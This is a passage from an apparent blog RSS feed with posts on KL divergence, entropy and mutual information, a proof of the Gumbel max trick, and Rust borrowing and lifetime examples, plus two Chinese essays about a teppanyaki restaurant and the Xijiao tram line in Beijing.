>$$D_{KL}(p_2(X|Y)||p_1(X|Y)) = \int p_2(y) p_2(x|y) \log \frac{p_2(x|y)}{p_1(x|y)} dxdy$$</p><h2 id="relation-to-shannon-entropy">Relation to Shannon Entropy</h2><p  class="par"> For a discrete variable $X$, with distribution $p$, we have:</p><p >$$H(X)=\log n - D_{KL}(p||v)$$</p><p  class="par"> where $n$ is number of values $X$ can take on, and $v$ is the uniform distribution on those values. The lemma suggests that $D_{KL}(p||v)$ measures the information difference between $p$ and a totally chaotic “bottom distribution”. From the perspective of transmission, KL divergence equals the length of additional bits required to encode a message, when the distribution of source alphabets shifts from $p$ to $v$.</p><p >For a continuous variable $X$ ranged within a finite set of volume $L$, we have:</p><p >$$H(X) = \log L - D_{KL}(p||v)$$</p><p  class="par"> where $v$ is a uniform distribution over the range of $X$. The interpretation is similar to discrete cases.</p><h2 id="relation-to-mutual-information">Relation to Mutual Information</h2><p  class="par"> We can observe that</p><p >$$I(X;Y)=D_{KL}(P(XY)||P(X)P(Y))$$</p><p  class="par"> which suggests mutual information $I(X;Y)$ is the information difference when distribution of $(X,Y)$ shifted from $P(X)P(Y)$ to $P(X,Y)$, i.e., from independent to dependent. </p><h2 id="additional-properties-of-kl-divergence">Additional Properties of KL Divergence</h2><p  class="noindent"> <strong>Addictivity</strong> Assume $X,Y$ are independent, and $P(x,y)=P_1(x)P_2(y)$, $Q$ likewisely. We have</p><p >$$\begin{align}D_{KL}(P(X,Y)||Q(X,Y)) &amp;= \int P(x,y) \log \frac{P(x,y)}{Q(x,y)} dxdy \\&amp;= \int P_1(x)P_2(y) \log \frac{P_1(x)P_2(y)}{Q_1(x)Q_2(y)} dxdy \\&amp;= \int P_1(x) \log \frac{P_1(x)}{Q_1(x)} dx + \int P_2(y) \log \frac{P_2(y)}{Q_2(y)} dy \\&amp;= D_{KL}(P_1||Q_1) + D_{KL}(P_2||Q_2)\end{align}$$</p><p  class="noindent"> <strong>Convexity</strong> Assume $p_1,p_2,q_1,q_2,p,q$ are distributions, $0 \leq \lambda \leq 1$. We have</p><p >$$D_{KL}(\lambda p_1 + (1 - \lambda) p_2 || q) \leq \lambda D_{KL}(p_1||q) + (1 - \lambda) D_{KL}(p_2||q)$$</p><p  class="par"> which can be derived from $\log x \leq x - 1$ when $0 &lt; x &lt; 1$. Similarly we have</p><p >$$D_{KL}(p || \lambda q_1 + (1 - \lambda) q_2) \leq \lambda D_{KL}(p||q_1) + (1 - \lambda) D_{KL}(p||q_2)$$</p><p  class="par"> which can be derived from the convexity of $\log(\cdot)$. Further we have</p><p >$$D_{KL}(\lambda p_1 + (1 - \lambda) p_2 || \lambda q_1 + (1 - \lambda) q_2) \leq \lambda D_{KL}(p_1 || q_1) + (1 - \lambda) D_{KL}(p_2|| q_2)$$</p><p  class="par"> which can be proved using the <a href="https://en.wikipedia.org/wiki/Log_sum_inequality">Log Sum Inequality</a>.</p><p  class="noindent"> <strong>Invariance</strong> Assume $U=g(X)$, then $D_{KL}(p(X)||q(X))=D_{KL}(p(U)||q(U))$, i.e., the form of KL divergence remains invariant under transforms. Mutual information, however, does not have such property.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Information-Theory/">Information Theory</category>
      
      
      <comments>https://i.hsfzxjy.site/information-theory-kl-divergence/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Information Theory: Entropy and Mutual Information</title>
      <link>https://i.hsfzxjy.site/information-theory-entropy-and-mutual-information/</link>
      <guid>https://i.hsfzxjy.site/information-theory-entropy-and-mutual-information/</guid>
      <pubDate>Fri, 03 Jan 2020 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Given a discrete r.v. $X$, where $X$ ranged in $&#92;{a_1, &#92;ldots, a_n&#92;}$, $&#92;mathbb{P}(X=a_k)=p_k$. Entropy $H(X)$ is defined as:&lt;/p&gt;
&lt;p &gt;$$</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Given a discrete r.v. $X$, where $X$ ranged in $\{a_1, \ldots, a_n\}$, $\mathbb{P}(X=a_k)=p_k$. Entropy $H(X)$ is defined as:</p><p >$$H(X)= - \sum_k p_k \log p_k$$</p><p  class="par"> When regarded as a function of $\{p_k\}$, entropy satisfies the following properties:</p><ol><li>$H(p_1,\ldots,p_n)$ is continuous, and non-negative;</li><li>$H(p_1,\ldots,p_n)$ is convex w.r.t. $(p_1,\ldots,p_n)$;</li><li>$H(p_1,\ldots,p_n)$ has a unique maxima $(\frac{1}{n},\ldots,\frac{1}{n})$;</li><li>$H(n):=H(\frac{1}{n},\ldots,\frac{1}{n})$ increases along with $n$;</li><li>$H(p_1,\ldots,p_n)=H(p_1+\ldots+p_k,p_{k+1},\ldots,p_n)+(p_1+\ldots+p_k)H(p_{k+1}&#39;,\ldots,p_n&#39;)$.</li></ol><p  class="par"> Property 5 is so-called addictivity. That is, if we observe $X$ in two steps, firstly obtaining a value from $\{\hat{a},a_{k+1},\ldots,a_n\}$ and then another value from $\{a_1,\ldots,a_k\}$ if $\hat{a}$ selected, the entropy of the whole system should be sum of these two subsystems.</p><p  class="nomargin"> Note that a function satisfying property 1, 4, 5 must have a form of $H(\vec{p})= - C \sum_k p_k \log p_k$, which reveals that entropy function is unique.</p><p >Entropy measures the <strong>uncertainty</strong> of a random value. Intuitively, entropy reaches its maximum $\log n$ when all alphabets occur with same probability, and likewise has a minimum of $0$ if $p_k=1$ for some $k$.</p><p >Entropy also represents the smallest average length to encode a message. Say we have a message consisting of alphabets $a_1,\ldots,a_n$, occurring with probability $p_1,\ldots,p_n$. Now we want to assign a code (an $N$-ary string) to each alphabet, with no two codes sharing a same prefix. The length of the codes are denoted as $l_1,\ldots,l_n$. <a href="https://en.wikipedia.org/wiki/Shannon%27s_source_coding_theorem">Shannon’s source coding theroem</a> states that the average code length $\sum_k p_k l_k$ could not be less than $H(p_1,\ldots,p_n)$ (taking $N$ as logarithm base).</p><p >We may generalize the definition to 2D random variables likewisely. Suppose $\mathbb{P}((X,Y)=(a_k,b_j))$ $=p(a_k,b_j)$. We define: $$H(XY)=\sum_{k,j} - p(a_k,b_j) \log p(a_k,b_j)$$. Rewrite the formula as:</p><p >$$\begin{align}H(XY) &amp;= \sum_{k,j} - p(a_k,b_j) \log p(a_k,b_j) \\      &amp;= \sum_k\sum_j - p(a_k,b_j) \log \left[ p(b_j) p(a_k|b_j) \right] \\      &amp;= \sum_j -p(b_j) \log p(b_j) - \sum_j p(b_j) \sum_k p(a_k|b_j) \log p(a_k|b_j) \\      &amp;= H(Y) - \sum_j p(b_j) H(X|b_j) \\      &amp;= H(Y) + H(X|Y) \\\end{align}$$</p><p  class="par"> where $H(X|Y)$ is weighted average of $H(X|\cdot)$, called <strong>conditional entropy</strong>. Symmetrically, we have $H(X)+H(Y|X)=H(Y)+H(X|Y)$. Further we have $H(XY) \leq H(X)+H(Y)$, since:</p><p >$$\begin{align}H(XY)-H(X)-H(Y) &amp;= \sum_{k,j} p(a_k,b_j) \log \frac{p(a_k)p(b_j)}{p(a_k,b_j)} \\ &amp;\leq \sum_{k,j} p(a_k,b_j) \left[ \frac{p(a_k)p(b_j)}{p(a_k,b_j)} - 1 \right] \\ &amp;=0\end{align}$$</p><p  class="par"> the equality holds $\iff X, Y$ are independent.</p><p >In summary, we have:</p><p >$$\begin{align}H(XY) &amp;\leq H(X)+H(Y) \\H(Y|X) &amp;\leq H(Y) \\H(X|Y) &amp;\leq H(X) \\\end{align}$$</p><p  class="par"> The latter two are intuitive – entropy (uncertainty) decreases if provided some prior.</p><h2 id="discrete-mutual-information">Discrete Mutual Information</h2><p  class="par"> The mutual information of $X,Y$ is defined as:</p><p >$$\begin{align}I(X|Y) &amp;= H(X)-H(X|Y) \\       &amp;= - \sum_k p(a_k) \log p(a_k) + \sum_j \sum_k p(a_k,b_j) \log p(a_k|b_j) \\       &amp;= \sum_{j,k} p(a_k,b_j) \log \frac{p(a_k, b_j)}{p(a_k)p(b_j)}\end{align}$$</p><p  class="par"> Intuitively, $I(X;Y)$ is the reduced information after prior $Y$ provided. It’s worth noting that $I(X;Y)=I(Y;X)$ and thus $I(\cdot;\cdot)$ is symmetric. We can define conditional mutual information likewisely:$$\begin{align}I(X;Y|Z) &amp;= \sum_i p(z_i) I(X|z_i;Y|z_i) \\         &amp;= \sum_i p(z_i) \sum_{k,j} p(a_k,b_j|z_i) \log \frac{p(a_k, b_j|z_i)}{p(a_k|z_i)p(b_j|z_i)} \\         &amp;= \sum_{i,j,k} p(a_k,b_j,z_i) \log \frac{p(a_k, b_j,z_i)p(z_i)}{p(a_k,z_i)p(b_j,z_i)}\end{align}$$</p><p >Some facts can be derived using the definition of entropy and mutual information:</p><p >$$\begin{align}I(X;Y)   &amp;= H(X) - H(X|Y) \\         &amp;= H(X) + H(Y) - H(XY) \\I(X;YZ)  &amp;= H(X) + H(YZ) - H(XYZ) \\I(X;Y|Z) &amp;= H(X|Z) - H(X|YZ) \\         &amp;= H(XZ) + H(YZ) - H(Z) - H(XYZ)\end{align}$$</p><p  class="par"> We can further define mutual information among three (or more) variables as:$$\begin{align}I(X;Y;Z) &amp;= I(X;Y)-I(X;Y|Z) \\         &amp;= H(X)+H(Y)+H(Z)-H(XY)-H(YZ)-H(XZ)+H(XYZ) \\\end{align}$$</p><p  class="par"> We may observe some similarity between the above formula and <a href="https://en.wikipedia.org/wiki/Inclusion%E2%80%93exclusion_principle">Inclusion-Exclusion Principle</a>. In fact, we can build a formal correspondence between entropy and set measure, as:</p><p >$$\begin{matrix}&amp;H(X)=\mu(A)     &amp;H(XY)=\mu(A \cup B) \\&amp;H(X|Y)=\mu(A-B) &amp;I(X;Y)=\mu(A \cap B) \\&amp;H(X;Y|Z)=\mu((A \cap B)-C) &amp;I(X;Y;Z)=\mu(A \cap B \cap C)\end{matrix}$$</p><p  class="par"> where $\mu$ is some set measure. The correspondence may be used as a helper for memorizing.</p><h2 id="continuous-cases">Continuous Cases</h2><p  class="par"> We first try to generalize entropy to continuous r.v.. Suppose $X$ has pdf $p(x)$, and $\pi=\{x_i\}_{-\infty}^\infty$ is a partition of $\mathbb{R}$, $|\pi|=\Delta x$. We may resemble discrete cases and write down the formula of “entropy”:</p><p >$$\sum_i - p(x_i) \log (p(x_i) \Delta x)$$</p><p  class="par"> Taking $\Delta x \rightarrow 0$, we have:</p><p >$$\begin{align}&amp;\lim_{\Delta x \rightarrow 0}\sum_i - p(x_i) \log (p(x_i) \Delta x) \\=&amp;\int -p(x) \log p(x) dx - \lim_{\Delta x \rightarrow 0}\sum_i - p(x_i) \log \Delta x\end{align}$$</p><p  class="par"> In practice, we omit the second term (since it’s infinite) and define the first one as <strong>differential entropy</strong>:</p><p >$$h(X):=\int_\mathbb{R} -p(x) \log p(x) dx$$</p><p  class="par"> We can define $h(X|Y)$ and $I(X;Y)$ likewisely.</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Information-Theory/">Information Theory</category>
      
      
      <comments>https://i.hsfzxjy.site/information-theory-entropy-and-mutual-information/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>铁板烧</title>
      <link>https://i.hsfzxjy.site/yakimono/</link>
      <guid>https://i.hsfzxjy.site/yakimono/</guid>
      <pubDate>Mon, 09 Dec 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;最近喜欢上了那家铁板烧。在寸土寸金的北京，那家店占据了食街不大的一角。开放式的厨房几乎就是它的全部。一圈细长的大理石柜台，被椅子围得严严实实。人们就此坐下，点菜，颇有一番日式的味道。隔着不高的玻璃，可以看到三个大厨在柜台另一边忙碌。食材触到铁板的「吱」响，伴随时不时的爆裂</description>
        
      
      
      
      <content:encoded><![CDATA[<p >最近喜欢上了那家铁板烧。在寸土寸金的北京，那家店占据了食街不大的一角。开放式的厨房几乎就是它的全部。一圈细长的大理石柜台，被椅子围得严严实实。人们就此坐下，点菜，颇有一番日式的味道。隔着不高的玻璃，可以看到三个大厨在柜台另一边忙碌。食材触到铁板的「吱」响，伴随时不时的爆裂声，白色的烟汽袅起，混合着诱人的香味，好不热闹。</p><p >入冬后，食街上的人更多了。日落后，室外温度急剧下降，这时来热闹的地方吃点热热的东西，再合适不过了。独自点上一份肉，一份菜，一碟满满的炒饭，吃得满面油光，奢侈而满足。推门而出，白天发生的不愉快，或是接下来要加班的怠惰，多少缓解了一些。但每次吃完，衣服上，头发上总会带上一股味道——铁板烧的味道，油烟的味道。</p><p >有人不在乎这味道，觉得这是烟火味，是相关料理的灵魂，是生活的气息。在以前，我是很痛恨这种说法的。吃火锅，或是烧烤时，高温食材逸散出的分子，几乎无孔不入，附在衣服上、头发上，就像被泼了一身油。每一回都要努力地洗澡，再将衣服由里至外换一遍，方可除去这种味道。我不能忍受这样的味道，藉而讨厌相关的料理。但近几年，这种想法似乎在慢慢消失，我开始能接受这种味道。尽管还是接受不了烧烤，但这种铁板烧倒是可以，甚至慢慢喜欢上了。</p><p >讨厌烟火味，和睡前一定要洗澡一样，这些观念的背后似乎有着奇妙的机理。人们小时候的经历，或是大人的说教，或是自身的负面遭遇，仿佛在主导这些观念。怕小鸡的以前踩死过小鸡，不敢吃鱼的是被鱼刺卡过。但我的这个观念好像是自发产生的，没有听从任何人表达过这样的观点，而是打心底里就讨厌这种味道。</p><p >如此根深蒂固的观念，又是如何被改变的呢？大概是太忙碌，忙得无暇顾及这类事。烟汽熏天的铁板烧，是我不可多得的闲暇时光。生活于生存之上，生存尚不能满足，又谈何更高层次的吹毛求疵？</p><p >一个习惯的改变，或者是一种生活方式的丧失。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      
      <comments>https://i.hsfzxjy.site/yakimono/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>西郊线</title>
      <link>https://i.hsfzxjy.site/xjx/</link>
      <guid>https://i.hsfzxjy.site/xjx/</guid>
      <pubDate>Wed, 02 Oct 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;西郊线真的是电车，那种拖着两个辫子，走得不快的电车。沿途的车站也是很小的车站。不到两米宽的站台，甚至比广州的 BRT 站更窄一些，立了一排凳子，仅此而已。半露天的车站，有遮雨棚，却没有真正意义的墙。透过一人多高的玻璃看，站台外沿长满了狗尾巴草，再往后铺开了大片的草甸和桦林</description>
        
      
      
      
      <content:encoded><![CDATA[<p >西郊线真的是电车，那种拖着两个辫子，走得不快的电车。沿途的车站也是很小的车站。不到两米宽的站台，甚至比广州的 BRT 站更窄一些，立了一排凳子，仅此而已。半露天的车站，有遮雨棚，却没有真正意义的墙。透过一人多高的玻璃看，站台外沿长满了狗尾巴草，再往后铺开了大片的草甸和桦林，一直延伸到远处的香山，和仿佛水洗后的天空。午前的秋阳给眼前的一切都染上了愉悦的暖色。</p><p >从巴沟逃下环状线，可以乘西郊线继续远离城市。我讨厌高楼林立的城市，也许是因为两个多月两点一线的生活。但我又离不开城市的便利，活像得斯德哥尔摩患者。在仅有的假日出游或许是个好选择，也或许是必要的。和地下的铁棺材不同，驶在地面上的西郊线能让人看清城市的衰减。巴沟往后，城市仿佛被逐渐稀释于山林，房子逐渐变矮直至消失，草甸开始成片最后蔓延开来。草甸有些许枯黄，或是因为季节或是因为纬度，却莫名搭上了秋阳的颜色。人真是奇怪的动物，明明知道自己无法生活于此，却会因这里的景色产生快感。</p><p ><img loading="lazy" src="https://imbed-1254463987.cos.ap-nanjing.myqcloud.com/xjx-img0.jpg" alt="../assets/2019-10-03-xjx-imgs/img0.jpg&gt;xjx-img0.jpg!width=800"></p><p >车门处无疑是最佳的观景点。将头抵在车门的玻璃上，窗外的世界便充满整个视野。这是一个不同步的世界。极力远眺，大地的尽头几乎是静止的；目光逐渐收回，从桦林到草甸再到脚下的铁轨，世界开始运动起来。西郊线也不同于一般陆上的地铁，不需要开在高架桥上，而是真的「在地上行走」。所谓铁轨，不过是两根细细的钢轨铺设在地面上，地面也没有其他特别之处，就像是行车的公路，水泥作的底板，边缘与荒草相接。这让人不禁产生一种错觉，即电车是直接行走在原野上，无拘无束，劈开半人高的草缓缓前进，就像「千と千尋の神隠し」里的水上火车。</p><p ><img loading="lazy" src="https://imbed-1254463987.cos.ap-nanjing.myqcloud.com/xjx-img1.jpg" alt="../assets/2019-10-03-xjx-imgs/img1.jpg&gt;xjx-img1.jpg!width=800"></p><p >偶尔有几处，路面突破了草地的禁锢，笔直伸向远方——那便是遇到了匝道口，铁路和公路相交的地方。电车经过时，匝道口当然是亮着红灯的。许多匝道口是空无一人的，没有在等候的灵魂，只有信号灯孤独地亮着。如果匝道口外有个观察者，在他看来，电车短暂地劈开了世界，世界在驶过后又重新相溶，恢复宁静；但从车内看，一闪而过的匝道像是分叉的铁轨，电车由此仿佛真的能驶出草甸，驶向大地的尽头。</p><p >电车为什么迷人呢？电气时代的工业设计是一点，人总是怀旧的。对于熟悉动漫的我，电车也是现实和童话的交叉点。但更重要的是，电车是「自由的」。虽有铁轨约束，坐在电车上的我却有如直接驶于公路上、原野间，与汽车并肩，与自然同行。这是我所不敢企求的。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      
      <comments>https://i.hsfzxjy.site/xjx/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Proof of the Gumbel Max Trick</title>
      <link>https://i.hsfzxjy.site/proof-of-gumbel-max-trick/</link>
      <guid>https://i.hsfzxjy.site/proof-of-gumbel-max-trick/</guid>
      <pubDate>Wed, 31 Jul 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;statement&quot;&gt;Statement&lt;/h2&gt;
&lt;p  class=&quot;noindent&quot;&gt; Assume that $&#92;alpha_1, &#92;alpha_2, &#92;ldots, &#92;alpha_n$ satisify $&#92;sum_k&#92;alpha_k=1$. Defi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="statement">Statement</h2><p  class="noindent"> Assume that $\alpha_1, \alpha_2, \ldots, \alpha_n$ satisify $\sum_k\alpha_k=1$. Define     </p><p >$$Z=\arg\max_k\{\log\alpha_k+G_k\}$$</p><p  class="par"> where $G_1,\ldots,G_n \text{ i.i.d.}\sim Gumbel(0,1)$, whose PDF and CDF are defined as</p><p >$$\begin{align}f(x)&amp;=e^{-(x+e^{-x})} \\F(x)&amp;=e^{-e^{-x}}\end{align}$$</p><p  class="par">. Then $\mathbb{P}(Z=k)=\alpha_k$.</p><h2 id="proof">Proof</h2><p  class="par"> Set $u_k=\log{\alpha_k}+G_k$. We prove by direct calculations.</p><p >$$\begin{align}\mathbb{P}(Z=k)&amp;=\mathbb{P}(u_k \geq u_j,\forall j \neq k) \\&amp;=\int_{-\infty}^\infty \mathbb{P}(u_k \geq u_j, \forall j \neq k|u_k)\mathbb{P}(u_k) du_k \\&amp;=\int_{-\infty}^\infty \prod_{j\neq k}\mathbb{P}(u_k \geq u_j|u_k)\mathbb{P}(u_k) du_k \\&amp;=\int_{-\infty}^\infty \prod_{j\neq k}e^{-e^{-u_k+\log \alpha_j}} e^{-(u_k-\log\alpha_k+e^{-(u_k-\log\alpha_k)})} du_k \\&amp;=\int_{-\infty}^\infty e^{-\sum_{j\neq k}\alpha_je^{-u_k}} \alpha_k e^{-(u_k+\alpha_k e^{-u_k})} du_k \\&amp;=\alpha_k \int_{-\infty}^\infty e^{-u_k-(\alpha_k+\sum_{j\neq k}\alpha_j)e^{-u_k}} du_k \\&amp;= \alpha_k\end{align}$$.</p><h2 id="application">Application</h2><p  class="par"> The trick is commonly used in DL to make sampling over a discrete distribution differentiable. </p><h2 id="references-4">References</h2><ul><li><a href="https://en.wikipedia.org/wiki/Gumbel_distribution">Gumbel Distribution - Wikipedia</a></li><li><a href="https://arxiv.org/pdf/1611.01144.pdf">Categorical Reparameterization with Gumbel-Softmax (ICLR 2017)</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Probability/">Probability</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Math/">Math</category>
      
      
      <comments>https://i.hsfzxjy.site/proof-of-gumbel-max-trick/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Option::as_ref</title>
      <link>https://i.hsfzxjy.site/option-as_ref/</link>
      <guid>https://i.hsfzxjy.site/option-as_ref/</guid>
      <pubDate>Tue, 25 Jun 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Let’s consider the following function:&lt;/p&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-display&quot;&gt;&lt;pre&gt;&lt;span class=&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Let’s consider the following function:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">use</span> std::ptr::NonNull;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">transform</span>&lt;T&gt;(option: &amp;<span class="hljs-type">Option</span>&lt;NonNull&lt;T&gt;&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;T&gt; {</span><br><span class="line">    option.<span class="hljs-title function_ invoke__">map</span>(|x| <span class="hljs-keyword">unsafe</span> { x.<span class="hljs-title function_ invoke__">as_ref</span>() })</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The function <code>transform</code> takes an <code>Option&lt;NonNull&lt;T&gt;&gt;</code> as input, and converts the inner pointer to an immutable reference <code>&amp;T</code> if possible. The method <code>NonNull::as_ref()</code> is marked unsafe so we need an <code>unsafe</code> block. The snippet causes an compilation error:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">error[E0515]: cannot return value referencing function parameter `x`</span><br><span class="line"> --&gt; src/main.rs:6:29</span><br><span class="line">  |</span><br><span class="line">6 |     option.map(|x| unsafe { x.as_ref() })</span><br><span class="line">  |                             -^^^^^^^^^</span><br><span class="line">  |                             |</span><br><span class="line">  |                             returns a value referencing data owned by the current function</span><br><span class="line">  | `x` is borrowed here</span><br></pre></div></div><p  class="par"> This is a common mistake when transforming <code>Option</code> s. To figure out the problem, we may try to take apart the signature and see how the value flows:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">Option</span>::map&lt;T, F&gt;(<span class="hljs-keyword">self</span>, f: F) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;T&gt;</span><br><span class="line">    <span class="hljs-keyword">where</span> F: <span class="hljs-title function_ invoke__">FnOnce</span>(NonNull&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;T&gt;</span><br><span class="line">{}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// which implies:</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">__closure</span>&lt;T&gt;(x: NonNull&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> &amp;T {}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">NonNull</span>::as_ref&lt;T, <span class="hljs-symbol">&#x27;a</span>&gt;(&amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">&#x27;a</span> T {}</span><br></pre></div></div><p  class="par"> where <code>__closure</code> denotes the closure <code>Option::map</code> takes.</p><p >Note that <code>Option::map</code> is a self-consuming method. During the calling, <code>option</code> is destructed, and the internal value with type <code>NonNull&lt;T&gt;</code> flows into <code>__closure</code> . The closure, however, consumes its argument as well. Consequently <code>x</code> would have a lifetime trapped in the closure. This is what <em>“data owned by the current function”</em> in the error message means.</p><p >Now take a look into the closure. Inside we call <code>NonNull::as_ref()</code> to convert a pointer into a reference, which assumes the pointer should live as long as the  reference returned. However, the implication could not be satisfied, since <code>x</code> the pointer lives only within the closure, but the reference would be passed out of the closure.  The compiler complains for the lifetime mismatch.</p><p >One can always employ <code>Option::as_ref()</code> as a solution. The function has a signature as below:</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">Option</span>::as_ref&lt;T&gt;(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;T&gt; {}</span><br></pre></div></div><p  class="par"> Calling <code>.as_ref()</code> on an <code>Option&lt;T&gt;</code> instance, say <code>x</code> , will return another Option with type <code>Option&lt;&amp;T&gt;</code> , say <code>ref_x</code> , which holds the reference to the inner value of <code>x</code> . It’s worth noting that <code>.as_ref()</code> takes <code>x</code> by reference, so no consuming happens here. Now we can perform <code>.map()</code> or <code>.unwrap()</code> on <code>ref_x</code> to extract the internal <code>&amp;T</code> , and call non-consuming methods on it (e.g., <code>NonNull::as_ref</code> ). <code>ref_x</code> will still be dropped after that, but it does not matter, since all it have is a reference.</p><p  class="noindent"> We can correct our code like this:</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">transform</span>&lt;T&gt;(option: &amp;<span class="hljs-type">Option</span>&lt;NonNull&lt;T&gt;&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Option</span>&lt;&amp;T&gt; {</span><br><span class="line">    option</span><br><span class="line">        .<span class="hljs-title function_ invoke__">as_ref</span>()  <span class="hljs-comment">// Note here</span></span><br><span class="line">        .<span class="hljs-title function_ invoke__">map</span>(|x| <span class="hljs-keyword">unsafe</span> { x.<span class="hljs-title function_ invoke__">as_ref</span>() })</span><br><span class="line">}</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Rust/">Rust</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Lifetime/">Lifetime</category>
      
      
      <comments>https://i.hsfzxjy.site/option-as_ref/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Rc, RefCell and Interior Mutability</title>
      <link>https://i.hsfzxjy.site/rc-refcell-pattern/</link>
      <guid>https://i.hsfzxjy.site/rc-refcell-pattern/</guid>
      <pubDate>Sat, 22 Jun 2019 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Say we need a type &lt;code&gt;Cursor&amp;lt;T&amp;gt;&lt;/code&gt; , which holds a mutable reference to &lt;code&gt;T&lt;/code&gt;. A method &lt;code&gt;.dup()&lt;/code&gt; duplic</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Say we need a type <code>Cursor&lt;T&gt;</code> , which holds a mutable reference to <code>T</code>. A method <code>.dup()</code> duplicates the internal reference, wraps it in a new instance of <code>Cursor&lt;T&gt;</code> and returns. Such pattern exists commonly in database driver library. Users could hold multiple cursors simultaneously, with each owning a (mutable) reference to the same connection object.</p><p >One might implements with a primitive mutable reference:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Cursor</span>&lt;<span class="hljs-symbol">&#x27;a</span>, T&gt; {</span><br><span class="line">    obj: &amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-keyword">mut</span> T,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span>&lt;<span class="hljs-symbol">&#x27;a</span>, T&gt; Cursor&lt;<span class="hljs-symbol">&#x27;a</span>, T&gt; {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(t: &amp;<span class="hljs-symbol">&#x27;a</span> <span class="hljs-keyword">mut</span> T) <span class="hljs-punctuation">-&gt;</span> Cursor&lt;<span class="hljs-symbol">&#x27;a</span>, T&gt; {</span><br><span class="line">        Cursor { obj: t }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">dup</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> Cursor&lt;T&gt; {</span><br><span class="line">        Cursor { obj: <span class="hljs-keyword">self</span>.obj }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">cursor_a</span> = Cursor::<span class="hljs-title function_ invoke__">new</span>(&amp;<span class="hljs-keyword">mut</span> i);</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-variable">_cursor_b</span> = cursor_a.<span class="hljs-title function_ invoke__">dup</span>();</span><br><span class="line">}</span><br></pre></div></div><p >Perfect and neat, and luckily Rust compiler did not complain. Fresh Rustanceans would have to work hard for shutting up the compiler, especially when fighting with references.</p><p >The invocation of <code>::new()</code> and <code>.dup()</code> are on separate lines. Now what about to chain up the constructor and <code>.dup()</code>? This time the compiler fails:</p><div class="gk-code hljs" 